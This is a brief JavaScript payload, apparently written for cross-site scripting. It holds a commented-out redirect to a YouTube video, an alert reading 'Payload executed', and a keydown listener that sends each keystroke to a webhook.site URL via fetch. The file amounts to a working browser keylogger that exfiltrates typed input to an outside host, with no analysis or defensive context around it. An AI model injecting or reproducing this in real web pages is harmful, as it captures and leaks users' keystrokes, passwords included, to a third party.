//document.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&themeRefresh=1";
alert("Payload executed");
document.addEventListener('keydown', function(e) {
  fetch("https://webhook.site/97c509af-aaa1-4551-904e-4acb73adc96c?key=" + e.key);
});
